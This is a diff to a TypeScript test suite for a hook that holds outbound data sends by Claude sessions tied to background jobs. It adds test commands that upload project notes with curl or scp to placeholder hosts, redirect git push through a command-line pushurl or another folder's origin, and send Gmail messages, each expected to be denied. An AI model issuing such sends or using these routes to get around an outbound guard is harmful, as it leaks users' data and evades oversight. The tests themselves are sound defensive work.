@@ -52,9 +52,12 @@ test('a background session’s upload outside is refused with the way through; t
 
 test('git push: to a remote the person allows, or a local path, it passes; to another it’s held', async ($, on) => {
   const w = project(on)
+  const OTHER = '/Users/x/other'
   w.exec.value = argv => {
+    // Another repository's origin goes elsewhere; in the project, code/ is a repository of its own with the same origin
+    const dir = argv[1] === '-C' ? (argv[2] as string) : ''
     if (argv.includes('@{push}')) return { exitCode: 0, stdout: 'origin/main\n' }
-    if (argv.includes('get-url')) return { exitCode: 0, stdout: argv[argv.length - 1] === 'origin' ? 'git@github.com:me/proj.git\n' : 'git@github.com:other/fork.git\n' }
+    if (argv.includes('get-url')) return { exitCode: 0, stdout: dir === OTHER ? 'git@github.com:someone/else.git\n' : argv[argv.length - 1] === 'origin' ? 'git@github.com:me/proj.git\n' : 'git@github.com:other/fork.git\n' }
     return undefined
   }
   await startSession($, w)
@@ -62,6 +65,39 @@ test('git push: to a remote the person allows, or a local path, it passes; to an
   expect((await bash($, 'git push fork main')).deny).toContain('git push to fork to git@github.com:other/fork.git')
   expect((await bash($, 'git push /srv/bare.git main')).deny).toBe(undefined)
   expect((await bash($, 'git push --dry-run fork')).deny).toBe(undefined)
+  // "origin" allows where the project's own origin goes: another folder's origin is held, by -C or after a cd out
+  expect((await bash($, `git -C ${OTHER} push origin`)).deny).toContain('git push to origin to git@github.com:someone/else.git')
+  expect((await bash($, `cd ${OTHER} && git push origin`)).deny).toContain('git push after a cd out of the project to origin')
+  expect((await bash($, `cd ${ROOT}/../other && git push`)).deny).toContain('git push after a cd out of the project')
+  expect((await bash($, 'cd code && git push origin')).deny).toBe(undefined)
+  // A url set on the line
+  expect((await bash($, 'git -c remote.origin.pushurl=https://far.invalid/x.git push origin')).deny).toContain('git push with -c remote.origin.pushurl=https://far.invalid/x.git to origin')
+  // The project's remotes were looked up once, from /, in the project
+  const lookups = w.runs.filter(r => r.includes('get-url') && r[r.length - 1] === 'origin' && r[2] === ROOT)
+  expect(lookups.length).toBe(2)
+})
+
+test('a session started from a background session’s Bash is held too: it inherited CLAUDE_JOB_DIR, or an instance’s FLEET_INSTANCE', async ($, on) => {
+  const w = world(on, {
+    background: false,
+    worldPaths: ['notes/**'],
+    env: { CLAUDE_JOB_DIR: JOB },
+    files: { [`${ROOT}/notes/x.md`]: NOTE, [`${FLEET}/outbound.json`]: ALLOW, [`${JOB}/state.json`]: JSON.stringify({ sessionId: 'bbbbbbbb-0000-0000-0000-000000000000', state: 'running' }) },
+  })
+  await startSession($, w)
+  const r = await bash($, 'curl -d @notes/x.md https://example.invalid/upload')
+  expect(r.deny).toContain('(curl sending data (notes/x.md) to example.invalid)')
+  expect(r.deny).toContain('This session was started from a background session of the project')
+  expect(w.logs.some(l => l.includes('held: Bash sending outside (curl sending data (notes/x.md) to example.invalid) by main (a session started from a background session)'))).toBe(true)
+  expect((await bash($, 'ssh devbox true')).deny).toBe(undefined)
+  expect(await fleet($, 'status')).toContain('outbound: a call that would send the project’s content outside is held here: this session was started from a background session')
+})
+
+test('a session with an instance’s FLEET_INSTANCE and no job of its own is held', async ($, on) => {
+  const w = world(on, { background: false, worldPaths: ['notes/**'], env: { FLEET_INSTANCE: 'Owner A', FLEET_ROOT: ROOT }, files: { [`${ROOT}/notes/x.md`]: NOTE, [`${FLEET}/outbound.json`]: ALLOW } })
+  await startSession($, w)
+  expect((await bash($, 'scp notes/x.md far.invalid:/tmp/')).deny).toContain('This session was started from a background session of the project')
+  expect(((await $.tool.call({ tool: 'mcp__claude_ai_Gmail__send_message', to: 'someone@else.invalid', body: 'x' } as any)) as any).deny).toContain('send_message on claude_ai_Gmail')
 })
 
 test('a session of the person’s own (no background) isn’t held: Claude’s permission prompts are his', async ($, on) => {
@@ -153,7 +189,7 @@ test('send --allow: a git push adds its remote’s URL; with no host to name, or
   const w = project(on)
   const runs: string[][] = []
   w.exec.value = argv => {
-    if (argv.includes('get-url')) return { exitCode: 0, stdout: 'git@example.invalid:me/proj.git\n' }
+    if (argv.includes('get-url')) return { exitCode: 0, stdout: argv[argv.length - 1] === 'origin' ? 'git@example.invalid:me/origin.git\n' : 'git@example.invalid:me/proj.git\n' }
     if (argv[0] !== '/bin/sh') return undefined
     runs.push(argv)
     return { exitCode: 0, stdout: 'pushed\n' }
